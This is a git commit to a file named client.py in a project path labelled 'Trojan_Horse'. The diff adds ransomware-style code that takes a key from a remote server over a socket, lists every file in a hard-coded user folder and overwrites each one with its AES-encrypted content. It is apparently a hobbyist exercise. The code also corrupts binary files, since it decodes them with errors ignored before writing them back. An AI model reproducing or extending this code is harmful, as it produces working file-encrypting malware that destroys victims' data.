c2ed377e57771f81924ff980d80fc7fb00fa0d20
yuval1847 <117625084+yuval1847@users.noreply.github.com>
2024-07-11 10:33:43 +0300

    Update client.py

--- Encryption/Trojan_Horse/Algo/client.py
+++ Encryption/Trojan_Horse/Algo/client.py
@@ -1,5 +1,7 @@
 import socket
 import SSL_Socket
+import AES_Cipher
+import Files_Enumeration
 
 class Client:
     """A class which represent a client."""
@@ -8,6 +10,23 @@ class Client:
         self.secretWord = self.clientSocket.GetMsg()
         print(self.secretWord)
 
+        self.pathToEncrypt = "C:\\Users\\yuval\\Desktop\\ABC"
+        self.listOfFiles = Files_Enumeration.FilesEnumeration(folderToScan=self.pathToEncrypt)
+
+    
+    def EncryptingFiles(self):
+        # The function gets nothing.
+        # The function encrypts all the files in the specific folder.
+        tempEncryptedContent = ""
+        for f in self.listOfFiles:
+            with open(f, 'rb') as file:
+                tempEncryptedContent = file.read()
+            with open(f, 'w') as file:
+                encrypted_content = AES_Cipher.AESCipher.aes_encrypt_decrypt(input_string=self.secretWord, message=tempEncryptedContent.decode('utf-8', errors='ignore'), action="encrypt")
+                file.write(encrypted_content)
+        print("All the files were encrypted successfully!")
+
 
 if __name__ == "__main__":
     clientObject = Client()
+    clientObject.EncryptingFiles()
